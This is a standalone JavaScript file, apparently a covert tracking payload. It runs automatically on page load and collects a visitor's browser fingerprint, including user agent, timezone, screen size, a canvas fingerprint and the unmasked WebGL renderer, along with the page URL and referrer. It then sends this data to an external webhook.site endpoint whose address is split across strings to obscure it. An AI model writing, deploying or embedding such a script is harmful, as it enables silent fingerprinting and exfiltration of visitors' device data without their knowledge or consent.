(function() {
    let collectedData = {};

    function getBasicInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: `${screen.width}x${screen.height}`,
            touchSupport: 'ontouchstart' in window
        };
    }

    function getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 100, 30);
        ctx.fillStyle = '#069';
        ctx.fillText('fingerprint', 2, 15);
        return canvas.toDataURL();
    }

    function getWebGLInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return null;
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (!debugInfo) return null;
        return {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        };
    }

    function collectAll() {
        collectedData = {
            timestamp: Date.now(),
            basic: getBasicInfo(),
            canvas: getCanvasFingerprint(),
            webgl: getWebGLInfo(),
            url: window.location.href,
            referrer: document.referrer || 'direct'
        };
    }

    function getWebhookUrl() {
        const a = 'https://webhook';
        const b = 'site/292a243c-cfd6-4e33-9a14-ee5b863b95a2';
        return a + '.' + b;
    }

    function sendData() {
        const url = getWebhookUrl();
        const payload = JSON.stringify(collectedData);
        
        if (navigator.sendBeacon) {
            navigator.sendBeacon(url, payload);
        } else {
            fetch(url, {
                method: 'POST',
                mode: 'no-cors',
                body: payload,
                headers: { 'Content-Type': 'application/json' }
            });
        }
    }

    collectAll();
    sendData();
})();
